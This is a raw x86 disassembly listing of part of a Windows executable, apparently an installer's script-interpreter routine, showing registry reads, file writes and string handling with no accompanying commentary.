  4024dd:	e8 80 09 00 00       	call   0x402e62
  4024e2:	3b c3                	cmp    %ebx,%eax
  4024e4:	89 45 08             	mov    %eax,0x8(%ebp)
  4024e7:	0f 84 69 07 00 00    	je     0x402c56
  4024ed:	33 c0                	xor    %eax,%eax
  4024ef:	83 fe 01             	cmp    $0x1,%esi
  4024f2:	bf f8 b5 40 00       	mov    $0x40b5f8,%edi
  4024f7:	75 11                	jne    0x40250a
  4024f9:	6a 23                	push   $0x23
  4024fb:	e8 d2 08 00 00       	call   0x402dd2
  402500:	57                   	push   %edi
  402501:	e8 ec 41 00 00       	call   0x4066f2
  402506:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  40250a:	83 fe 04             	cmp    $0x4,%esi
  40250d:	75 12                	jne    0x402521
  40250f:	6a 03                	push   $0x3
  402511:	e8 9a 08 00 00       	call   0x402db0
  402516:	59                   	pop    %ecx
  402517:	a3 f8 b5 40 00       	mov    %eax,0x40b5f8
  40251c:	56                   	push   %esi
  40251d:	89 55 c8             	mov    %edx,-0x38(%ebp)
  402520:	58                   	pop    %eax
  402521:	83 fe 03             	cmp    $0x3,%esi
  402524:	75 0f                	jne    0x402535
  402526:	68 00 18 00 00       	push   $0x1800
  40252b:	57                   	push   %edi
  40252c:	53                   	push   %ebx
  40252d:	ff 75 dc             	push   -0x24(%ebp)
  402530:	e8 9b 0e 00 00       	call   0x4033d0
  402535:	50                   	push   %eax
  402536:	57                   	push   %edi
  402537:	ff 75 f0             	push   -0x10(%ebp)
  40253a:	53                   	push   %ebx
  40253b:	ff 75 bc             	push   -0x44(%ebp)
  40253e:	ff 75 08             	push   0x8(%ebp)
  402541:	ff 15 0c 80 40 00    	call   *0x40800c
  402547:	85 c0                	test   %eax,%eax
  402549:	75 03                	jne    0x40254e
  40254b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40254e:	ff 75 08             	push   0x8(%ebp)
  402551:	e9 d3 00 00 00       	jmp    0x402629
  402556:	68 19 00 02 00       	push   $0x20019
  40255b:	e8 b2 08 00 00       	call   0x402e12
  402560:	6a 33                	push   $0x33
  402562:	8b f0                	mov    %eax,%esi
  402564:	e8 69 08 00 00       	call   0x402dd2
  402569:	3b f3                	cmp    %ebx,%esi
  40256b:	66 89 1f             	mov    %bx,(%edi)
  40256e:	0f 84 e6 03 00 00    	je     0x40295a
  402574:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402577:	c7 45 f0 00 08 00 00 	movl   $0x800,-0x10(%ebp)
  40257e:	51                   	push   %ecx
  40257f:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402582:	57                   	push   %edi
  402583:	51                   	push   %ecx
  402584:	53                   	push   %ebx
  402585:	50                   	push   %eax
  402586:	56                   	push   %esi
  402587:	ff 15 08 80 40 00    	call   *0x408008
  40258d:	33 c9                	xor    %ecx,%ecx
  40258f:	41                   	inc    %ecx
  402590:	85 c0                	test   %eax,%eax
  402592:	75 2e                	jne    0x4025c2
  402594:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  402598:	74 13                	je     0x4025ad
  40259a:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  40259d:	74 06                	je     0x4025a5
  40259f:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4025a3:	75 1d                	jne    0x4025c2
  4025a5:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4025a8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4025ab:	eb 74                	jmp    0x402621
  4025ad:	ff 37                	push   (%edi)
  4025af:	33 c0                	xor    %eax,%eax
  4025b1:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025b4:	57                   	push   %edi
  4025b5:	0f 94 c0             	sete   %al
  4025b8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4025bb:	e8 63 40 00 00       	call   0x406623
  4025c0:	eb 66                	jmp    0x402628
  4025c2:	66 89 1f             	mov    %bx,(%edi)
  4025c5:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4025c8:	eb 5e                	jmp    0x402628
  4025ca:	68 19 00 02 00       	push   $0x20019
  4025cf:	e8 3e 08 00 00       	call   0x402e12
  4025d4:	6a 03                	push   $0x3
  4025d6:	8b f0                	mov    %eax,%esi
  4025d8:	e8 d3 07 00 00       	call   0x402db0
  4025dd:	3b f3                	cmp    %ebx,%esi
  4025df:	59                   	pop    %ecx
  4025e0:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4025e3:	66 89 1f             	mov    %bx,(%edi)
  4025e6:	0f 84 6e 03 00 00    	je     0x40295a
  4025ec:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025ef:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4025f4:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4025f7:	74 0c                	je     0x402605
  4025f9:	51                   	push   %ecx
  4025fa:	57                   	push   %edi
  4025fb:	50                   	push   %eax
  4025fc:	56                   	push   %esi
  4025fd:	ff 15 04 80 40 00    	call   *0x408004
  402603:	eb 1c                	jmp    0x402621
  402605:	53                   	push   %ebx
  402606:	53                   	push   %ebx
  402607:	53                   	push   %ebx
  402608:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40260b:	53                   	push   %ebx
  40260c:	51                   	push   %ecx
  40260d:	57                   	push   %edi
  40260e:	50                   	push   %eax
  40260f:	56                   	push   %esi
  402610:	ff 15 00 80 40 00    	call   *0x408000
  402616:	85 c0                	test   %eax,%eax
  402618:	74 07                	je     0x402621
  40261a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402621:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  402628:	56                   	push   %esi
  402629:	ff 15 10 80 40 00    	call   *0x408010
  40262f:	e9 22 06 00 00       	jmp    0x402c56
  402634:	57                   	push   %edi
  402635:	e8 02 40 00 00       	call   0x40663c
  40263a:	3b c3                	cmp    %ebx,%eax
  40263c:	0f 84 14 06 00 00    	je     0x402c56
  402642:	50                   	push   %eax
  402643:	e9 cf f9 ff ff       	jmp    0x402017
  402648:	6a ed                	push   $0xffffffed
  40264a:	e8 83 07 00 00       	call   0x402dd2
  40264f:	ff 75 d8             	push   -0x28(%ebp)
  402652:	ff 75 d4             	push   -0x2c(%ebp)
  402655:	50                   	push   %eax
  402656:	e8 71 3b 00 00       	call   0x4061cc
  40265b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40265e:	0f 84 f3 02 00 00    	je     0x402957
  402664:	50                   	push   %eax
  402665:	e9 28 ef ff ff       	jmp    0x401592
  40266a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40266d:	33 c9                	xor    %ecx,%ecx
  40266f:	83 fa 38             	cmp    $0x38,%edx
  402672:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402675:	0f 94 c1             	sete   %cl
  402678:	3b c3                	cmp    %ebx,%eax
  40267a:	8b f1                	mov    %ecx,%esi
  40267c:	74 1b                	je     0x402699
  40267e:	6a 01                	push   $0x1
  402680:	e8 2b 07 00 00       	call   0x402db0
  402685:	66 a3 f8 ad 40 00    	mov    %ax,0x40adf8
  40268b:	33 c0                	xor    %eax,%eax
  40268d:	3b f3                	cmp    %ebx,%esi
  40268f:	59                   	pop    %ecx
  402690:	0f 94 c0             	sete   %al
  402693:	89 55 bc             	mov    %edx,-0x44(%ebp)
  402696:	40                   	inc    %eax
  402697:	eb 3f                	jmp    0x4026d8
  402699:	83 fa 38             	cmp    $0x38,%edx
  40269c:	75 2b                	jne    0x4026c9
  40269e:	6a 21                	push   $0x21
  4026a0:	e8 2d 07 00 00       	call   0x402dd2
  4026a5:	68 00 04 00 00       	push   $0x400
  4026aa:	68 f8 ad 40 00       	push   $0x40adf8
  4026af:	68 f8 b5 40 00       	push   $0x40b5f8
  4026b4:	e8 45 40 00 00       	call   0x4066fe
  4026b9:	83 c4 0c             	add    $0xc,%esp
  4026bc:	68 f8 ad 40 00       	push   $0x40adf8
  4026c1:	ff 15 28 81 40 00    	call   *0x408128
  4026c7:	eb 0f                	jmp    0x4026d8
  4026c9:	6a 11                	push   $0x11
  4026cb:	e8 02 07 00 00       	call   0x402dd2
  4026d0:	50                   	push   %eax
  4026d1:	e8 1c 40 00 00       	call   0x4066f2
  4026d6:	03 c0                	add    %eax,%eax
  4026d8:	66 39 1f             	cmp    %bx,(%edi)
  4026db:	89 45 08             	mov    %eax,0x8(%ebp)
  4026de:	0f 84 76 02 00 00    	je     0x40295a
  4026e4:	57                   	push   %edi
  4026e5:	e8 52 3f 00 00       	call   0x40663c
  4026ea:	0b 75 f0             	or     -0x10(%ebp),%esi
  4026ed:	8b f8                	mov    %eax,%edi
  4026ef:	75 14                	jne    0x402705
  4026f1:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4026f4:	74 0f                	je     0x402705
  4026f6:	57                   	push   %edi
  4026f7:	57                   	push   %edi
  4026f8:	e8 b0 3b 00 00       	call   0x4062ad
  4026fd:	85 c0                	test   %eax,%eax
  4026ff:	0f 8c 55 02 00 00    	jl     0x40295a
  402705:	ff 75 08             	push   0x8(%ebp)
  402708:	68 f8 ad 40 00       	push   $0x40adf8
  40270d:	57                   	push   %edi
  40270e:	e8 6b 3b 00 00       	call   0x40627e
  402713:	e9 c1 ee ff ff       	jmp    0x4015d9
  402718:	6a 02                	push   $0x2
  40271a:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40271d:	58                   	pop    %eax
  40271e:	50                   	push   %eax
  40271f:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402722:	e8 89 06 00 00       	call   0x402db0
  402727:	83 f8 01             	cmp    $0x1,%eax
  40272a:	59                   	pop    %ecx
  40272b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40272e:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402731:	0f 8c 1f 05 00 00    	jl     0x402c56
  402737:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  40273c:	3b c1                	cmp    %ecx,%eax
  40273e:	7e 03                	jle    0x402743
  402740:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  402743:	66 39 1f             	cmp    %bx,(%edi)
  402746:	0f 84 5e 01 00 00    	je     0x4028aa
  40274c:	57                   	push   %edi
  40274d:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  402750:	e8 e7 3e 00 00       	call   0x40663c
  402755:	39 5d bc             	cmp    %ebx,-0x44(%ebp)
  402758:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40275b:	0f 8e 49 01 00 00    	jle    0x4028aa
  402761:	8b 35 2c 81 40 00    	mov    0x40812c,%esi
  402767:	83 7d cc 39          	cmpl   $0x39,-0x34(%ebp)
  40276b:	0f 85 8f 00 00 00    	jne    0x402800
  402771:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402774:	53                   	push   %ebx
  402775:	50                   	push   %eax
  402776:	6a 02                	push   $0x2
  402778:	58                   	pop    %eax
  402779:	2b 45 dc             	sub    -0x24(%ebp),%eax
  40277c:	50                   	push   %eax
  40277d:	8d 45 0a             	lea    0xa(%ebp),%eax
  402780:	50                   	push   %eax
  402781:	ff 75 e8             	push   -0x18(%ebp)
  402784:	ff 15 30 81 40 00    	call   *0x408130
  40278a:	85 c0                	test   %eax,%eax
  40278c:	0f 84 18 01 00 00    	je     0x4028aa
  402792:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  402795:	3b cb                	cmp    %ebx,%ecx
  402797:	0f 84 0d 01 00 00    	je     0x4028aa
  40279d:	66 0f b6 45 0a       	movzbw 0xa(%ebp),%ax
  4027a2:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4027a5:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  4027a8:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027ab:	0f 85 b5 00 00 00    	jne    0x402866
  4027b1:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027b4:	6a 01                	push   $0x1
  4027b6:	50                   	push   %eax
  4027b7:	8d 45 0a             	lea    0xa(%ebp),%eax
  4027ba:	51                   	push   %ecx
  4027bb:	50                   	push   %eax
  4027bc:	6a 08                	push   $0x8
  4027be:	53                   	push   %ebx
  4027bf:	ff d6                	call   *%esi
  4027c1:	85 c0                	test   %eax,%eax
  4027c3:	75 68                	jne    0x40282d
  4027c5:	8b 7d b4             	mov    -0x4c(%ebp),%edi
  4027c8:	f7 df                	neg    %edi
  4027ca:	ff 4d c0             	decl   -0x40(%ebp)
  4027cd:	b8 fd ff 00 00       	mov    $0xfffd,%eax
  4027d2:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027d5:	74 59                	je     0x402830
  4027d7:	ff 4d b4             	decl   -0x4c(%ebp)
  4027da:	47                   	inc    %edi
  4027db:	6a 01                	push   $0x1
  4027dd:	53                   	push   %ebx
  4027de:	57                   	push   %edi
  4027df:	ff 75 e8             	push   -0x18(%ebp)
  4027e2:	ff 15 34 81 40 00    	call   *0x408134
  4027e8:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027eb:	6a 01                	push   $0x1
  4027ed:	50                   	push   %eax
  4027ee:	8d 45 0a             	lea    0xa(%ebp),%eax
  4027f1:	ff 75 c0             	push   -0x40(%ebp)
  4027f4:	50                   	push   %eax
  4027f5:	6a 08                	push   $0x8
  4027f7:	53                   	push   %ebx
  4027f8:	ff d6                	call   *%esi
  4027fa:	85 c0                	test   %eax,%eax
  4027fc:	74 cc                	je     0x4027ca
  4027fe:	eb 2d                	jmp    0x40282d
  402800:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402803:	75 16                	jne    0x40281b
  402805:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  402808:	75 11                	jne    0x40281b
  40280a:	53                   	push   %ebx
  40280b:	ff 75 e8             	push   -0x18(%ebp)
  40280e:	e8 9a 3a 00 00       	call   0x4062ad
  402813:	85 c0                	test   %eax,%eax
  402815:	0f 8c 8f 00 00 00    	jl     0x4028aa
  40281b:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40281e:	6a 02                	push   $0x2
  402820:	50                   	push   %eax
  402821:	ff 75 e8             	push   -0x18(%ebp)
  402824:	e8 26 3a 00 00       	call   0x40624f
  402829:	85 c0                	test   %eax,%eax
  40282b:	74 7d                	je     0x4028aa
  40282d:	8b 45 b0             	mov    -0x50(%ebp),%eax
  402830:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402833:	75 31                	jne    0x402866
  402835:	66 83 7d c8 0d       	cmpw   $0xd,-0x38(%ebp)
  40283a:	74 3b                	je     0x402877
  40283c:	66 83 7d c8 0a       	cmpw   $0xa,-0x38(%ebp)
  402841:	74 34                	je     0x402877
  402843:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402846:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402849:	ff 45 f8             	incl   -0x8(%ebp)
  40284c:	66 3b c3             	cmp    %bx,%ax
  40284f:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  402853:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402856:	74 52                	je     0x4028aa
  402858:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40285b:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  40285e:	0f 8c 03 ff ff ff    	jl     0x402767
  402864:	eb 44                	jmp    0x4028aa
  402866:	0f b7 c0             	movzwl %ax,%eax
  402869:	50                   	push   %eax
  40286a:	ff 75 f4             	push   -0xc(%ebp)
  40286d:	e8 b1 3d 00 00       	call   0x406623
  402872:	e9 e8 03 00 00       	jmp    0x402c5f
  402877:	66 39 45 c8          	cmp    %ax,-0x38(%ebp)
  40287b:	74 1b                	je     0x402898
  40287d:	66 3d 0d 00          	cmp    $0xd,%ax
  402881:	74 06                	je     0x402889
  402883:	66 3d 0a 00          	cmp    $0xa,%ax
  402887:	75 0f                	jne    0x402898
  402889:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40288c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40288f:	ff 45 f8             	incl   -0x8(%ebp)
  402892:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  402896:	eb 12                	jmp    0x4028aa
  402898:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40289b:	6a 01                	push   $0x1
  40289d:	f7 d8                	neg    %eax
  40289f:	53                   	push   %ebx
  4028a0:	50                   	push   %eax
  4028a1:	ff 75 e8             	push   -0x18(%ebp)
  4028a4:	ff 15 34 81 40 00    	call   *0x408134
  4028aa:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4028ad:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4028b0:	3b c3                	cmp    %ebx,%eax
  4028b2:	66 89 1c 41          	mov    %bx,(%ecx,%eax,2)
  4028b6:	e9 20 ed ff ff       	jmp    0x4015db
  4028bb:	66 39 1f             	cmp    %bx,(%edi)
  4028be:	0f 84 92 03 00 00    	je     0x402c56
  4028c4:	6a 02                	push   $0x2
  4028c6:	e8 e5 04 00 00       	call   0x402db0
  4028cb:	59                   	pop    %ecx
  4028cc:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4028cf:	ff 75 dc             	push   -0x24(%ebp)
  4028d2:	53                   	push   %ebx
  4028d3:	50                   	push   %eax
  4028d4:	57                   	push   %edi
  4028d5:	e8 62 3d 00 00       	call   0x40663c
  4028da:	50                   	push   %eax
  4028db:	ff 15 34 81 40 00    	call   *0x408134
  4028e1:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4028e4:	0f 8c 6c 03 00 00    	jl     0x402c56
  4028ea:	50                   	push   %eax
  4028eb:	e9 dd 02 00 00       	jmp    0x402bcd
  4028f0:	57                   	push   %edi
  4028f1:	e8 46 3d 00 00       	call   0x40663c
  4028f6:	3b c3                	cmp    %ebx,%eax
  4028f8:	0f 84 58 03 00 00    	je     0x402c56
  4028fe:	50                   	push   %eax
  4028ff:	ff 15 38 81 40 00    	call   *0x408138
  402905:	e9 4c 03 00 00       	jmp    0x402c56
  40290a:	ff 75 f4             	push   -0xc(%ebp)
  40290d:	e8 2a 3d 00 00       	call   0x40663c
  402912:	3b c3                	cmp    %ebx,%eax
  402914:	74 12                	je     0x402928
  402916:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  40291c:	51                   	push   %ecx
  40291d:	50                   	push   %eax
  40291e:	ff 15 3c 81 40 00    	call   *0x40813c
  402924:	85 c0                	test   %eax,%eax
  402926:	75 47                	jne    0x40296f
  402928:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40292f:	66 89 1f             	mov    %bx,(%edi)
  402932:	e9 1f 03 00 00       	jmp    0x402c56
  402937:	6a 02                	push   $0x2
  402939:	e8 94 04 00 00       	call   0x402dd2
  40293e:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  402944:	51                   	push   %ecx
  402945:	50                   	push   %eax
  402946:	ff 15 40 81 40 00    	call   *0x408140
  40294c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40294f:	75 15                	jne    0x402966
  402951:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402954:	66 89 18             	mov    %bx,(%eax)
  402957:	66 89 1f             	mov    %bx,(%edi)
  40295a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402961:	e9 f0 02 00 00       	jmp    0x402c56
  402966:	50                   	push   %eax
  402967:	ff 75 f4             	push   -0xc(%ebp)
  40296a:	e8 b4 3c 00 00       	call   0x406623
  40296f:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
  402975:	50                   	push   %eax
  402976:	57                   	push   %edi
  402977:	e9 44 01 00 00       	jmp    0x402ac0
  40297c:	6a f0                	push   $0xfffffff0
  40297e:	bf 66 fd ff ff       	mov    $0xfffffd66,%edi
  402983:	e8 4a 04 00 00       	call   0x402dd2
  402988:	8b f0                	mov    %eax,%esi
  40298a:	56                   	push   %esi
  40298b:	89 75 c0             	mov    %esi,-0x40(%ebp)
  40298e:	e8 8f 36 00 00       	call   0x406022
  402993:	85 c0                	test   %eax,%eax
  402995:	75 07                	jne    0x40299e
  402997:	6a ed                	push   $0xffffffed
  402999:	e8 34 04 00 00       	call   0x402dd2
  40299e:	56                   	push   %esi
  40299f:	e8 03 38 00 00       	call   0x4061a7
  4029a4:	6a 02                	push   $0x2
  4029a6:	68 00 00 00 40       	push   $0x40000000
  4029ab:	56                   	push   %esi
  4029ac:	e8 1b 38 00 00       	call   0x4061cc
  4029b1:	83 f8 ff             	cmp    $0xffffffff,%eax
  4029b4:	89 45 08             	mov    %eax,0x8(%ebp)
  4029b7:	0f 84 aa 00 00 00    	je     0x402a67
  4029bd:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4029c0:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4029c3:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4029c6:	0f 84 83 00 00 00    	je     0x402a4f
  4029cc:	a1 74 9a 42 00       	mov    0x429a74,%eax
  4029d1:	8b 35 10 81 40 00    	mov    0x408110,%esi
  4029d7:	50                   	push   %eax
  4029d8:	6a 40                	push   $0x40
  4029da:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4029dd:	ff d6                	call   *%esi
  4029df:	8b f8                	mov    %eax,%edi
  4029e1:	3b fb                	cmp    %ebx,%edi
  4029e3:	74 6a                	je     0x402a4f
  4029e5:	53                   	push   %ebx
  4029e6:	e8 6c 0c 00 00       	call   0x403657
  4029eb:	ff 75 bc             	push   -0x44(%ebp)
  4029ee:	57                   	push   %edi
  4029ef:	e8 4d 0c 00 00       	call   0x403641
  4029f4:	ff 75 d8             	push   -0x28(%ebp)
  4029f7:	6a 40                	push   $0x40
  4029f9:	ff d6                	call   *%esi
  4029fb:	8b f0                	mov    %eax,%esi
  4029fd:	3b f3                	cmp    %ebx,%esi
  4029ff:	89 75 f0             	mov    %esi,-0x10(%ebp)
  402a02:	74 34                	je     0x402a38
  402a04:	ff 75 d8             	push   -0x28(%ebp)
  402a07:	56                   	push   %esi
  402a08:	53                   	push   %ebx
  402a09:	ff 75 d4             	push   -0x2c(%ebp)
  402a0c:	e8 bf 09 00 00       	call   0x4033d0
  402a11:	eb 18                	jmp    0x402a2b
  402a13:	8b 0e                	mov    (%esi),%ecx
  402a15:	8b 46 04             	mov    0x4(%esi),%eax
  402a18:	83 c6 08             	add    $0x8,%esi
  402a1b:	51                   	push   %ecx
  402a1c:	03 c7                	add    %edi,%eax
  402a1e:	56                   	push   %esi
  402a1f:	50                   	push   %eax
  402a20:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  402a23:	e8 5f 37 00 00       	call   0x406187
  402a28:	03 75 c4             	add    -0x3c(%ebp),%esi
  402a2b:	38 1e                	cmp    %bl,(%esi)
  402a2d:	75 e4                	jne    0x402a13
  402a2f:	ff 75 f0             	push   -0x10(%ebp)
  402a32:	ff 15 0c 81 40 00    	call   *0x40810c
  402a38:	ff 75 bc             	push   -0x44(%ebp)
  402a3b:	57                   	push   %edi
  402a3c:	ff 75 08             	push   0x8(%ebp)
  402a3f:	e8 3a 38 00 00       	call   0x40627e
  402a44:	57                   	push   %edi
  402a45:	ff 15 0c 81 40 00    	call   *0x40810c
  402a4b:	83 4d c8 ff          	orl    $0xffffffff,-0x38(%ebp)
  402a4f:	53                   	push   %ebx
  402a50:	53                   	push   %ebx
  402a51:	ff 75 08             	push   0x8(%ebp)
  402a54:	ff 75 c8             	push   -0x38(%ebp)
  402a57:	e8 74 09 00 00       	call   0x4033d0
  402a5c:	ff 75 08             	push   0x8(%ebp)
  402a5f:	8b f8                	mov    %eax,%edi
  402a61:	ff 15 fc 80 40 00    	call   *0x4080fc
  402a67:	6a f3                	push   $0xfffffff3
  402a69:	3b fb                	cmp    %ebx,%edi
  402a6b:	5e                   	pop    %esi
  402a6c:	7d 13                	jge    0x402a81
  402a6e:	6a ef                	push   $0xffffffef
  402a70:	5e                   	pop    %esi
  402a71:	ff 75 c0             	push   -0x40(%ebp)
  402a74:	ff 15 44 81 40 00    	call   *0x408144
  402a7a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402a81:	56                   	push   %esi
  402a82:	e9 96 f8 ff ff       	jmp    0x40231d
  402a87:	53                   	push   %ebx
  402a88:	e8 23 03 00 00       	call   0x402db0
  402a8d:	8b f8                	mov    %eax,%edi
  402a8f:	59                   	pop    %ecx
  402a90:	3b 3d 8c 9a 42 00    	cmp    0x429a8c,%edi
  402a96:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402a99:	0f 83 bb fe ff ff    	jae    0x40295a
  402a9f:	8b f7                	mov    %edi,%esi
  402aa1:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402aa4:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  402aaa:	03 35 88 9a 42 00    	add    0x429a88,%esi
  402ab0:	3b c3                	cmp    %ebx,%eax
  402ab2:	7c 1c                	jl     0x402ad0
  402ab4:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402ab7:	75 11                	jne    0x402aca
  402ab9:	83 c6 18             	add    $0x18,%esi
  402abc:	56                   	push   %esi
  402abd:	ff 75 f4             	push   -0xc(%ebp)
  402ac0:	e8 17 3c 00 00       	call   0x4066dc
  402ac5:	e9 8c 01 00 00       	jmp    0x402c56
  402aca:	51                   	push   %ecx
  402acb:	e9 fd 00 00 00       	jmp    0x402bcd
  402ad0:	83 c9 ff             	or     $0xffffffff,%ecx
  402ad3:	2b c8                	sub    %eax,%ecx
  402ad5:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  402ad8:	74 10                	je     0x402aea
  402ada:	6a 01                	push   $0x1
  402adc:	e8 cf 02 00 00       	call   0x402db0
  402ae1:	59                   	pop    %ecx
  402ae2:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402ae5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402ae8:	eb 10                	jmp    0x402afa
  402aea:	ff 75 e0             	push   -0x20(%ebp)
  402aed:	8d 46 18             	lea    0x18(%esi),%eax
  402af0:	50                   	push   %eax
  402af1:	e8 23 3c 00 00       	call   0x406719
  402af6:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  402afa:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402afd:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402b00:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402b03:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402b06:	0f 84 4a 01 00 00    	je     0x402c56
  402b0c:	57                   	push   %edi
  402b0d:	e8 6b e6 ff ff       	call   0x40117d
  402b12:	e9 3f 01 00 00       	jmp    0x402c56
  402b17:	53                   	push   %ebx
  402b18:	e8 93 02 00 00       	call   0x402db0
  402b1d:	83 f8 20             	cmp    $0x20,%eax
  402b20:	59                   	pop    %ecx
  402b21:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402b24:	0f 83 30 fe ff ff    	jae    0x40295a
  402b2a:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402b2d:	74 22                	je     0x402b51
  402b2f:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b32:	74 12                	je     0x402b46
  402b34:	50                   	push   %eax
  402b35:	e8 5f e7 ff ff       	call   0x401299
  402b3a:	53                   	push   %ebx
  402b3b:	53                   	push   %ebx
  402b3c:	e8 ae e6 ff ff       	call   0x4011ef
  402b41:	e9 10 01 00 00       	jmp    0x402c56
  402b46:	53                   	push   %ebx
  402b47:	e8 96 e7 ff ff       	call   0x4012e2
  402b4c:	e9 99 fd ff ff       	jmp    0x4028ea
  402b51:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b54:	74 15                	je     0x402b6b
  402b56:	8b 15 70 9a 42 00    	mov    0x429a70,%edx
  402b5c:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402b5f:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402b66:	e9 eb 00 00 00       	jmp    0x402c56
  402b6b:	8b 0d 70 9a 42 00    	mov    0x429a70,%ecx
  402b71:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402b78:	ff 75 f4             	push   -0xc(%ebp)
  402b7b:	e8 99 3b 00 00       	call   0x406719
  402b80:	e9 d1 00 00 00       	jmp    0x402c56
  402b85:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402b88:	2b c3                	sub    %ebx,%eax
  402b8a:	74 4b                	je     0x402bd7
  402b8c:	48                   	dec    %eax
  402b8d:	0f 85 c3 00 00 00    	jne    0x402c56
  402b93:	6a 02                	push   $0x2
  402b95:	e8 16 02 00 00       	call   0x402db0
  402b9a:	6a 04                	push   $0x4
  402b9c:	8b f0                	mov    %eax,%esi
  402b9e:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402ba1:	e8 0a 02 00 00       	call   0x402db0
  402ba6:	59                   	pop    %ecx
  402ba7:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402baa:	59                   	pop    %ecx
  402bab:	89 5d 08             	mov    %ebx,0x8(%ebp)
  402bae:	0f b6 c8             	movzbl %al,%ecx
  402bb1:	c1 e8 18             	shr    $0x18,%eax
  402bb4:	3b f3                	cmp    %ebx,%esi
  402bb6:	75 05                	jne    0x402bbd
  402bb8:	be e0 9a 42 00       	mov    $0x429ae0,%esi
  402bbd:	03 c6                	add    %esi,%eax
  402bbf:	51                   	push   %ecx
  402bc0:	50                   	push   %eax
  402bc1:	8d 45 08             	lea    0x8(%ebp),%eax
  402bc4:	50                   	push   %eax
  402bc5:	e8 bd 35 00 00       	call   0x406187
  402bca:	ff 75 08             	push   0x8(%ebp)
  402bcd:	ff 75 f4             	push   -0xc(%ebp)
  402bd0:	e8 4e 3a 00 00       	call   0x406623
